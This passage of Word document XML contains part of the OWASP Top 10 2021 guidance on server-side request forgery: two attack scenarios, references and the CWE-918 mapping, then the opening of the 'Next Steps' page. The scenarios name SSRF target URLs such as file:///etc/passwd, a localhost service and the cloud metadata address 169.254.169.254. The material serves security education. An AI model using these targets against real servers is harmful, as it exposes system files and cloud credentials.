          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>files or internal services to gain sensitive information such</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5CE73CC3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3605" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3606" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>as `file:///etc/passwd` and `http://localhost:28017/`.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E12F7DB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3607" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28BB5F6E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3608" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3609" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>3:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* Access metadata storage of cloud services – Most cloud</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3748D4C1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3610" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3611" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>providers have metadata storage such as `http://169.254.169.254/`. An</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0016C922" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3612" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3613" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>attacker can read the metadata to gain sensitive information.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="052EC8BD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3614" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ED7B4A7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3615" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3616" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>4:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* Compromise internal services – The attacker can abuse</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="643A68CA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3617" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3618" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>internal services to conduct further attacks such as Remote Code</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2FD2FA68" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3619" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3620" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Execution (RCE) or Denial of Service (DoS).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4BDD2645" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3621" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E1211A2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3622" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3623" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## References </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="163B7BA0" w14:textId="77777777" w:rsidR="00A70057" w:rsidRPr="00841D1E" w:rsidRDefault="00A70057" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3624" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="030261B3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3625" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3626" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP - Server-Side Request Forgery Prevention Cheat </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sheet](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D6AC8D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3627" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3628" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>PortSwigger</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> - Server-side request forgery (SSRF</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://portswigger.net/web-security/ssrf) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="54A7145B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3629" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3630" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Acunetix</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> - What is Server-Side Request Forgery (SSRF)</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>?](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)  -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28C4BF67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3631" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3632" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00723C24">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:t xml:space="preserve">[SSRF </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:t>bible](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          </w:rPr>
          <w:t>https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1EEF8BD1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3633" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3634" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00723C24">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>!](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="66D389A5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3635" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C546C09" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3636" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DC18118" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3637" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3638" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="738237CD" w14:textId="77777777" w:rsidR="00A70057" w:rsidRPr="00841D1E" w:rsidRDefault="00A70057" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3639" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65A3BB9E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3640" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3641" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-918: Server-Side Request Forgery (SSRF</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/918.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="63931D0C" w14:textId="77777777" w:rsidR="00AC649A" w:rsidRDefault="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="556177E3" w14:textId="2A38E417" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174110FD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>source:  "https://owasp.org/Top10/A11_2021-Next_Steps.md/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3635855D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A11:2021 – Next Steps"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4A1741" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A11:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6AE39E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>lang:    "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAAF76C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE2A79A"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#A11:2021 – Next Steps </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45448FB8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">{{ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>osib</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
